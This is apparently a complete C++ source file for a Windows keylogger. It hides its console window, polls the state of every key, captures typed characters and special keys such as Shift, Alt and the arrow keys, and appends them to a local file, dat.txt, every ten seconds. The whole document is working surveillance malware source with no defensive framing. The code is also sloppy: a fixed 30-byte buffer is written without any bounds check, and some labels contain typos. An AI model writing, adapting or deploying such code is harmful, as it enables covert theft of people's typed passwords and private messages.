#include <iostream>
#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <ctime>
#include <chrono>

using namespace std;
using namespace chrono;

void LOG(string input, int &counter, char* &str) {
	int len = input.length();
	for (int i = 0; i < len; i++)
	{
		str[counter] = input[i];
		counter++;
	}
}

bool SpecialKeys(int S_Key, int &counter, char* &str) {
	switch (S_Key) {
	case VK_SPACE:
		cout << " ";
		LOG(" ", counter, str);
		return true;
	case VK_RETURN:
		cout << "\n";
		LOG("\n", counter, str);
		return true;
	case '¾':
		cout << ".";
		LOG(".", counter, str);
		return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		LOG("#SHIFT#", counter, str);
		return true;
	case VK_BACK:
		cout << "\b";
		LOG("\b", counter, str);
		return true;
	case VK_RBUTTON:
		cout << "#R_CLICK#";
		LOG("#R_CLICK#", counter, str);
		return true;
	case VK_CAPITAL:
		cout << "#CAPS_LOCK#";
		LOG("#CAPS_LCOK", counter, str);
		return true;
	case VK_TAB:
		cout << "#TAB";
		LOG("#TAB", counter, str);
		return true;
	case VK_UP:
		cout << "#UP";
		LOG("#UP_ARROW_KEY", counter, str);
		return true;
	case VK_DOWN:
		cout << "#DOWN";
		LOG("#DOWN_ARROW_KEY", counter, str);
		return true;
	case VK_LEFT:
		cout << "#LEFT";
		LOG("#LEFT_ARROW_KEY", counter, str);
		return true;
	case VK_RIGHT:
		cout << "#RIGHT";
		LOG("#RIGHT_ARROW_KEY", counter, str);
		return true;
	case VK_CONTROL:
		cout << "#CONTROL";
		LOG("#CONTROL", counter, str);
		return true;
	case VK_MENU:
		cout << "#ALT";
		LOG("#ALT", counter, str);
		return true;
	default:
		return false;
	}
}

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char KEY = 'x';
	int n = 30, counter = 0;
	char* str = new char[n];
	auto start = high_resolution_clock::now();
	bool flag = true;
	while (true) 
	{
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			auto end = high_resolution_clock::now();
			if (duration_cast<seconds>(end - start).count() % 10 == 0 && flag)
			{
				flag = false;
				if (counter > 0) 
				{
					fstream LogFile;
					LogFile.open("dat.txt", fstream::app);
					if (LogFile.is_open())
					{
						for (int i = 0; i <= counter; i++)
						{
							LogFile << str[i];
							cout << str[i];
						}
					}
					counter = 0;
					LogFile.close();
				}
			}
			if (duration_cast<seconds>(end - start).count() % 10 == 1 && !flag)
				flag = true;
			if (GetAsyncKeyState(KEY) == -32767)
			{
				if (SpecialKeys(KEY, counter, str) == false) 
				{
					str[counter] = char(KEY);
					counter++;
				}
			}
		}
	}
	system("pause");
	return 0;
}
